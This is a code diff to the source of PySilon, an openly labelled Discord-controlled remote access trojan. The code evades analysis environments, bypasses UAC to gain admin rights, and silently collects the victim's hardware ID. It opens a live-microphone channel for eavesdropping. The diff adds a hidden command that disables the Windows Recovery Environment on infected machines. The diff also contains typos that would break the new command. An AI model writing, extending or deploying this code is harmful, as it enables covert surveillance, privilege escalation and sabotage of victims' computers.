@@ -1,5 +1,6 @@
 import discord
 import os
+import ctypes
 import subprocess
 from discord.ext import commands
 import resources.modules.misc as pysilon_misc
@@ -7,30 +8,27 @@ import resources.modules.protections as pysilon_protections
 import resources.modules.uac_bypass as uac_bypass
 from urllib.request import urlopen
 
+def IsAdmin() -> bool:
+    return ctypes.windll.shell32.IsUserAnAdmin() == 1
+
 if pysilon_protections.protection_check():
     os._exit(0)
 
 if pysilon_protections.single_instance_lock():
     os._exit(0)
 
-if not uac_bypass.IsAdmin():
+if not IsAdmin():
     if uac_bypass.GetSelf()[1]:
         if uac_bypass.UACbypass():
             os._exit(0)
 
 client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_insensitive=True)
 
-# temp area for needed variables, mategol you should add something to do this automatically in the builder ig :p
-turned_off = False
-clipper_stop = False
-# end of area
-
 bot_token = ""
 guild_ids = []
 channel_ids = {                                                    
     'info': 'auto',                                               
     'main': 'auto',                                                                                               
-    'file': 'auto',
     'voice': 'auto'                                                                                            
 }
 
@@ -41,7 +39,7 @@ async def on_ready():
     guild_id_index = 0
     guild_id = guild_ids[guild_id_index]
 
-    hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
+    hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
     category_not_found = True
     break_loop = False
     for _ in guild_ids:
@@ -70,9 +68,9 @@ async def on_ready():
         for channel in category.channels:
             category_channel_names.append(channel.name)
 
-        if 'file-related' not in category_channel_names and channel_ids['file']: 
-            temp = await client.get_guild(guild_id).create_text_channel('file', category=category)
-            channel_ids['file'] = temp.id
+        if 'main' not in category_channel_names and channel_ids['main']: 
+            temp = await client.get_guild(guild_id).create_text_channel('main', category=category)
+            channel_ids['main'] = temp.id
 
         if 'Live microphone' not in category_channel_names and channel_ids['voice']: 
             temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
@@ -82,7 +80,6 @@ async def on_ready():
         category = await client.get_guild(guild_id).create_category(hwid)
         temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
         temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
-        temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id
         temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
 
         try: 
@@ -109,8 +106,6 @@ async def on_ready():
                 channel_ids['info'] = channel.id
             elif channel.name == 'main':
                 channel_ids['main'] = channel.id
-            elif channel.name == 'file-related':
-                channel_ids['file'] = channel.id
             elif channel.name == 'Live microphone':
                 channel_ids['voice'] = channel.id
 
@@ -143,4 +138,28 @@ async def delete_category(ctx,  argument=None, password=None):
     else: 
         await ctx.send("```Improper arguments. \n\nUsage: .implode <normal / full> <password>```")
 
-# [pysilon] commands
+@client.commanc(name="reset")
+async def reset_agentc_handler(ctx, argument=None):
+    if argument == "block":
+        await ctx.message.delete()
+        if IsAdmin():
+            subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
+            embed = discord.Embed(title="🟣 System",description=f'```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+        else:
+            embed = discord.Embed(title="📛 Error",description=f'```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+    elif argument == "unblock":
+        await ctx.message.delete()
+        if IsAdmin():
+            subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
+            embed = discord.Embed(title="🟣 System",description=f'```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+        else:
+            embed = discord.Embed(title="📛 Error",description=f'```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+    else: ctx.send("The **reset** command should be followed by **block** or ***unvloxk**")
